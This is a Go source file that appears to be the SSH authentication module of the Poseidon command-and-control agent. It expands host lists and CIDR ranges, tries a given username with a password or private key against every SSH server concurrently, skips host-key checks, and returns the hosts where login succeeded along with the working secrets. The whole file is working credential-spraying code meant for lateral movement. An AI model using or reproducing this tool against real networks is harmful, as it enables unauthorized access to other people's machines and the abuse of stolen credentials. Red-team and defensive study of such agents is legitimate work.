package sshauth

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"sync"
	"time"

	"github.com/xorrior/poseidon/pkg/commands/portscan"
	"github.com/xorrior/poseidon/pkg/utils/structs"
	"golang.org/x/crypto/ssh"
	"golang.org/x/sync/semaphore"
)

var (
	sshResultChan = make(chan SSHResult)
)

// SSHAuthenticator Governs the lock of ssh authentication attempts
type SSHAuthenticator struct {
	host string
	lock *semaphore.Weighted
}

// Credential Manages credential objects for authentication
type Credential struct {
	Username   string
	Password   string
	PrivateKey string
}

type SSHTestParams struct {
	Hosts      []string `json:"hosts"`
	Port       int      `json:"port"`
	Username   string   `json:"username"`
	Password   string   `json:"password"`
	PrivateKey string   `json:"private_key"`
}

type SSHResult struct {
	Status   string `json:"status"`
	Success  bool   `json:"success"`
	Username string `json:"username"`
	Secret   string `json:"secret"`
	Host     string `json:"host"`
}

// SSH Functions
func PublicKeyFile(file string) ssh.AuthMethod {
	buffer, err := ioutil.ReadFile(file)
	if err != nil {
		return nil
	}

	key, err := ssh.ParsePrivateKey(buffer)
	if err != nil {
		return nil
	}
	return ssh.PublicKeys(key)
}

func SSHLogin(host string, port int, cred Credential, debug bool) {
	var sshConfig *ssh.ClientConfig
	if cred.PrivateKey == "" {
		sshConfig = &ssh.ClientConfig{
			User:            cred.Username,
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         500 * time.Millisecond,
			Auth:            []ssh.AuthMethod{ssh.Password(cred.Password)},
		}
	} else {
		sshConfig = &ssh.ClientConfig{
			User:            cred.Username,
			Timeout:         500 * time.Millisecond,
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Auth:            []ssh.AuthMethod{PublicKeyFile(cred.PrivateKey)},
		}
	}
	// log.Println("Dialing:", host)
	res := SSHResult{
		Host:     host,
		Username: cred.Username,
	}
	if cred.PrivateKey == "" {
		res.Secret = cred.Password
		// successStr = fmt.Sprintf("[SSH] Hostname: %s\tUsername: %s\tPassword: %s", host, cred.Username, cred.Password)
	} else {
		res.Secret = cred.PrivateKey
		// successStr = fmt.Sprintf("[SSH] Hostname: %s\tUsername: %s\tPassword: %s", host, cred.Username, cred.PrivateKey)
	}
	connectionStr := fmt.Sprintf("%s:%d", host, port)
	connection, err := ssh.Dial("tcp", connectionStr, sshConfig)
	if err != nil {
		if debug {
			errStr := fmt.Sprintf("[DEBUG] Failed to dial: %s", err)
			fmt.Println(errStr)
		}
		res.Success = false
		sshResultChan <- res
		return
	}
	session, err := connection.NewSession()
	if err != nil {
		res.Success = false
		res.Status = err.Error()
		sshResultChan <- res
		return
	}
	session.Close()

	res.Success = true
	sshResultChan <- res
}

func (auth *SSHAuthenticator) Brute(port int, creds []Credential, debug bool) {
	wg := sync.WaitGroup{}

	for i := 0; i < len(creds); i++ {
		auth.lock.Acquire(context.TODO(), 1)
		wg.Add(1)
		go func(port int, cred Credential, debug bool) {
			defer auth.lock.Release(1)
			defer wg.Done()
			SSHLogin(auth.host, port, cred, debug)
		}(port, creds[i], debug)
	}
	wg.Wait()
}

func SSHBruteHost(host string, port int, creds []Credential, debug bool) {
	var lim int64 = 100
	auth := &SSHAuthenticator{
		host: host,
		lock: semaphore.NewWeighted(lim),
	}
	auth.Brute(port, creds, debug)
}

func SSHBruteForce(hosts []string, port int, creds []Credential, debug bool) []SSHResult {
	for i := 0; i < len(hosts); i++ {
		go func(host string, port int, creds []Credential, debug bool) {
			SSHBruteHost(host, port, creds, debug)
		}(hosts[i], port, creds, debug)
	}
	var successfulHosts []SSHResult
	for i := 0; i < len(hosts); i++ {
		res := <-sshResultChan
		if res.Success {
			successfulHosts = append(successfulHosts, res)
		}
	}
	return successfulHosts
}

func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
	tMsg := structs.ThreadMsg{}
	params := SSHTestParams{}
	// do whatever here
	tMsg.TaskItem = task
	// log.Println("Task params:", string(task.Params))
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		log.Println("Error unmarshalling params:", err.Error())
		tMsg.TaskResult = []byte(err.Error())
		tMsg.Error = true
		threadChannel <- tMsg
		return
	}
	// log.Println("Parsed task params!")
	if len(params.Hosts) == 0 {
		tMsg.TaskResult = []byte("Error: No host or list of hosts given.")
		tMsg.Error = true
		threadChannel <- tMsg
		return
	}

	if params.Password == "" && params.PrivateKey == "" {
		tMsg.TaskResult = []byte("Error: No password or private key given to attempt authentication with.")
		tMsg.Error = true
		threadChannel <- tMsg
		return
	}

	if params.Username == "" {
		tMsg.TaskResult = []byte("Error: No username given to attempt authentication with.")
		tMsg.Error = true
		threadChannel <- tMsg
		return
	}

	var totalHosts []string
	for i := 0; i < len(params.Hosts); i++ {
		newCidr, err := portscan.NewCIDR(params.Hosts[i])
		if err != nil {
			continue
		} else {
			// Iterate through every host in hostCidr
			for j := 0; j < len(newCidr.Hosts); j++ {
				totalHosts = append(totalHosts, newCidr.Hosts[j].PrettyName)
			}
			// cidrs = append(cidrs, newCidr)
		}
	}

	if params.Port == 0 {
		params.Port = 22
	}

	cred := Credential{
		Username:   params.Username,
		Password:   params.Password,
		PrivateKey: params.PrivateKey,
	}
	// log.Println("Beginning brute force...")
	results := SSHBruteForce(totalHosts, params.Port, []Credential{cred}, false)
	// log.Println("Finished!")
	if len(results) > 0 {
		data, err := json.MarshalIndent(results, "", "    ")
		// // fmt.Println("Data:", string(data))
		if err != nil {
			log.Println("Error was not nil when marshalling!", err.Error())
			tMsg.TaskResult = []byte(err.Error())
			tMsg.Error = true
		} else {
			// fmt.Println("Sending on up the data:\n", string(data))
			tMsg.TaskResult = data
			tMsg.Error = false
		}
	} else {
		// log.Println("No successful auths.")
		tMsg.TaskResult = []byte("[-] No successful authentication attempts.")
		tMsg.Error = false
	}
	threadChannel <- tMsg // Pass the thread msg back through the channel here
}
